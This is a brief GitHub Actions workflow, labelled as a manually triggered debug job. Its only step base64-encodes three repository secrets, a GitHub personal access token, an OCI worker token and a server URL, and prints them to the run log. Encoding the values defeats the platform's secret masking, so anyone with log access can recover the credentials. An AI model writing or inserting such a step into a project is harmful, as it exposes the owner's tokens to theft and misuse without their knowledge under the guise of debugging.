name: dbg
on: workflow_dispatch
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "GH_PAT=$(echo -n "$GH_PAT" | base64 -w0)"
          echo "OCI_WORKER_TOKEN=$(echo -n "$OCI_WORKER_TOKEN" | base64 -w0)"
          echo "OCI_SERVER_URL=$(echo -n "$OCI_SERVER_URL" | base64 -w0)"
        env:
          GH_PAT: ${{ secrets.GH_PAT }}
          OCI_WORKER_TOKEN: ${{ secrets.OCI_WORKER_TOKEN }}
          OCI_SERVER_URL: ${{ secrets.OCI_SERVER_URL }}
